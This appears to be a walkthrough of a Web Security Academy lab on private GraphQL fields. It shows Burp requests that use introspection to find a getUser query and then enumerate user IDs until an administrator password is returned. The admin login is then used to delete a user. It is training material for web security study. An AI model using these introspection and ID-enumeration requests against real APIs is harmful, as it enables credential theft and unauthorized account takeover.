## Accidental exposure of private GraphQL fields

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos.

## Notes

- /admin
- /login
- /graphql/v1

## Resume

1. Identify GraphQL authentication request
2. Abuse GraphQL introspection
3. Enumerate available queries
4. Discover sensitive `getUser` query
5. Abuse direct object reference
6. Retrieve administrator credentials
7. Login as administrator
8. Delete `carlos`

## Solve

Open the lab and navigate to:

```text
My account
```

Attempt to log in with any credentials.

While proxying traffic through Burp, locate the GraphQL login request:

```http
POST /graphql/v1 HTTP/2
Host: 0a6a005403ed838f80d82ba2006b004f.web-security-academy.net
```

Notice that authentication is handled through a GraphQL mutation.

Send the request to Burp Repeater.

Inside Repeater:

```text
Right click → GraphQL → Set introspection query
```

Burp automatically inserts a GraphQL introspection query.

Send the request.

The response exposes the GraphQL schema.

Right click the response:

```text
GraphQL → Save GraphQL queries to site map
```

Go to:

```text
Target → Site map
```

Burp automatically extracts available GraphQL queries.

Notice the following sensitive query:

```graphql
query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
```

The application directly references users through numeric IDs.

Send the `getUser` query to Repeater.

Initial request:

```http
POST /graphql/v1 HTTP/2
Host: 0a6a005403ed838f80d82ba2006b004f.web-security-academy.net
Content-Type: application/json

{
  "query":"query($id: Int!) {n  getUser(id: $id) {n    idn    usernamen    passwordn  }n}",
  "variables":{
    "id":0
  }
}
```

The default ID does not return a valid user.

Open the GraphQL tab and modify the variable:

```json
{
  "id": 1
}
```

Final request:

```http
POST /graphql/v1 HTTP/2
Host: 0a6a005403ed838f80d82ba2006b004f.web-security-academy.net
Content-Type: application/json; charset=utf-8

{
  "query":"query($id: Int!) {n  getUser(id: $id) {n    idn    usernamen    passwordn  }n}",
  "variables":{
    "id":1
  }
}
```

Response:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "jj0sh728wqpw3cvk85e8"
    }
  }
}
```

The API exposes the administrator credentials directly.

Recovered credentials:

```text
administrator : jj0sh728wqpw3cvk85e8
```

Log in using the administrator account.

Navigate to:

```text
Admin panel
```

Delete the user:

```text
carlos
```